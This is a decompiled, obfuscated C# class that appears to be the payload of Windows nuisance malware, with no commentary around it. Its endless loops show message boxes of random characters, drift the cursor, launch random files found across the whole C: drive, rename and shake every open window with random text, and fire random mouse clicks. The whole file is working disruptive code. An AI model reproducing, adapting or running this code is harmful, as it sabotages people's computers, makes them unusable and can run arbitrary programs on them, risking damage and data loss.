using System;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

internal class Class3
{
  public static readonly IntPtr intptr_0 = IntPtr.Zero;

  [DllImport("user32.dll")]
  public static extern bool SetCursorPos(int int_0, int int_1);

  [DllImport("user32.dll", CharSet = CharSet.Auto)]
  public static extern bool SetWindowTextW(IntPtr intptr_1, string string_0);

  [DllImport("user32.dll")]
  public static extern bool EnumWindows(Class3.Delegate0 delegate0_0, IntPtr intptr_1);

  [DllImport("user32.dll", CharSet = CharSet.Auto)]
  public static extern int GetWindowText(IntPtr intptr_1, StringBuilder stringBuilder_0, int int_0);

  [DllImport("user32.dll", SetLastError = true)]
  public static extern IntPtr GetWindowRect(IntPtr intptr_1, out Class3.Struct0 struct0_0);

  [DllImport("user32.dll", SetLastError = true)]
  public static extern bool SetWindowPos(
    IntPtr intptr_1,
    IntPtr intptr_2,
    int int_0,
    int int_1,
    int int_2,
    int int_3,
    uint uint_0);

  [DllImport("user32.dll", SetLastError = true)]
  public static extern bool IsWindowVisible(IntPtr intptr_1);

  [DllImport("user32.dll")]
  public static extern bool MoveWindow(
    IntPtr intptr_1,
    int int_0,
    int int_1,
    int int_2,
    int int_3,
    bool bool_0);

  [DllImport("user32.dll")]
  public static extern bool EnumChildWindows(
    IntPtr intptr_1,
    Class3.Delegate0 delegate0_0,
    IntPtr intptr_2);

  [DllImport("user32.dll")]
  public static extern void mouse_event(
    uint uint_0,
    uint uint_1,
    uint uint_2,
    uint uint_3,
    UIntPtr uintptr_0);

  [DllImport("user32.dll")]
  private static extern IntPtr GetDesktopWindow();

  public static void smethod_0()
  {
    string text = Class3.smethod_6(960);
    while (true)
    {
      int num = (int) MessageBox.Show(text, "", MessageBoxButtons.YesNo, MessageBoxIcon.Hand);
    }
  }

  public static void smethod_1()
  {
    while (true)
    {
      Point position = Cursor.Position;
      int int_0 = position.X + 2;
      position = Cursor.Position;
      int int_1 = position.Y + 2;
      Class3.SetCursorPos(int_0, int_1);
      Thread.Sleep(100);
    }
  }

  public static void smethod_2()
  {
    while (true)
    {
      Random random = new Random();
      try
      {
        string[] files = Directory.GetFiles("C:\\", "*.*", SearchOption.AllDirectories);
        Process.Start(files[random.Next(files.Length)]);
      }
      catch (Exception ex)
      {
        Console.WriteLine("can't open the file:" + ex?.ToString());
      }
      Thread.Sleep(random.Next(1, 100));
    }
  }

  public static void smethod_3()
  {
    while (true)
    {
      Class3.EnumChildWindows(Class3.GetDesktopWindow(), new Class3.Delegate0(Class3.smethod_4), IntPtr.Zero);
      Class3.EnumWindows(new Class3.Delegate0(Class3.smethod_4), IntPtr.Zero);
      Thread.Sleep(1000);
    }
  }

  private static bool smethod_4(IntPtr intptr_1, IntPtr intptr_2)
  {
    Random random = new Random();
    StringBuilder stringBuilder_0 = new StringBuilder(256);
    Class3.GetWindowText(intptr_1, stringBuilder_0, stringBuilder_0.Capacity);
    Class3.Struct0 struct0_0;
    Class3.GetWindowRect(intptr_1, out struct0_0);
    int int0 = struct0_0.int_0;
    int int1 = struct0_0.int_1;
    int width = struct0_0.method_9().Width;
    int height = struct0_0.method_9().Height;
    Class3.SetWindowTextW(intptr_1, Class3.smethod_6(196));
    Class3.SetWindowPos(intptr_1, Class3.intptr_0, int0 + random.Next(-5, 5), int1 + random.Next(-5, 5), width + random.Next(-1, 1), height + random.Next(-1, 1), 4U);
    return true;
  }

  public static void smethod_5()
  {
    while (true)
    {
      if (new Random().Next(2) == 1)
      {
        Class3.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        Thread.Sleep(1);
        Class3.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
      }
      else
        goto label_3;
label_2:
      Thread.Sleep(49);
      continue;
label_3:
      Class3.mouse_event(16U, 0U, 0U, 0U, UIntPtr.Zero);
      Thread.Sleep(1);
      Class3.mouse_event(8U, 0U, 0U, 0U, UIntPtr.Zero);
      goto label_2;
    }
  }

  public static string smethod_6(int int_0)
  {
    Random random = new Random();
    string str = "";
    for (int index = 0; index < int_0; ++index)
    {
      int utf32 = random.Next(1, 221);
      str += char.ConvertFromUtf32(utf32);
    }
    return str;
  }

  public struct Struct0(int int_4, int int_5, int int_6, int int_7)
  {
    public int int_0 = int_4;
    public int int_1 = int_5;
    public int int_2 = int_6;
    public int int_3 = int_7;

    public Struct0(Rectangle rectangle_0)
      : this(rectangle_0.Left, rectangle_0.Top, rectangle_0.Right, rectangle_0.Bottom)
    {
    }

    [SpecialName]
    public int method_0() => this.int_0;

    [SpecialName]
    public void method_1(int int_4)
    {
      this.int_2 -= this.int_0 - int_4;
      this.int_0 = int_4;
    }

    [SpecialName]
    public int method_2() => this.int_1;

    [SpecialName]
    public void method_3(int int_4)
    {
      this.int_3 -= this.int_1 - int_4;
      this.int_1 = int_4;
    }

    [SpecialName]
    public int method_4() => this.int_3 - this.int_1;

    [SpecialName]
    public void method_5(int int_4) => this.int_3 = int_4 + this.int_1;

    [SpecialName]
    public int okClaynbtx() => this.int_2 - this.int_0;

    [SpecialName]
    public void method_6(int int_4) => this.int_2 = int_4 + this.int_0;

    [SpecialName]
    public Point method_7() => new Point(this.int_0, this.int_1);

    [SpecialName]
    public void method_8(Point point_0)
    {
      this.method_1(point_0.X);
      this.method_3(point_0.Y);
    }

    [SpecialName]
    public Size method_9() => new Size(this.okClaynbtx(), this.method_4());

    [SpecialName]
    public void method_10(Size size_0)
    {
      this.method_6(size_0.Width);
      this.method_5(size_0.Height);
    }

    public static implicit operator Rectangle(Class3.Struct0 struct0_0)
    {
      return new Rectangle(struct0_0.int_0, struct0_0.int_1, struct0_0.okClaynbtx(), struct0_0.method_4());
    }

    public static implicit operator Class3.Struct0(Rectangle rectangle_0)
    {
      return new Class3.Struct0(rectangle_0);
    }

    public static bool operator ==(Class3.Struct0 struct0_0, Class3.Struct0 struct0_1)
    {
      return struct0_0.method_11(struct0_1);
    }

    public static bool operator !=(Class3.Struct0 struct0_0, Class3.Struct0 struct0_1)
    {
      return !struct0_0.method_11(struct0_1);
    }

    public bool method_11(Class3.Struct0 struct0_0)
    {
      return struct0_0.int_0 == this.int_0 && struct0_0.int_1 == this.int_1 && struct0_0.int_2 == this.int_2 && struct0_0.int_3 == this.int_3;
    }

    public override bool Equals(object obj)
    {
      bool flag;
      switch (obj)
      {
        case Class3.Struct0 struct0_0:
          flag = this.method_11(struct0_0);
          break;
        case Rectangle rectangle_0:
          flag = this.method_11(new Class3.Struct0(rectangle_0));
          break;
        default:
          flag = false;
          break;
      }
      return flag;
    }

    public override int GetHashCode() => ((Rectangle) this).GetHashCode();

    public override string ToString()
    {
      return string.Format((IFormatProvider) CultureInfo.CurrentCulture, "{{Left={0},Top={1},Right={2},Bottom={3}}}", (object) this.int_0, (object) this.int_1, (object) this.int_2, (object) this.int_3);
    }
  }

  public delegate bool Delegate0(IntPtr hwnd, IntPtr lParam);
}
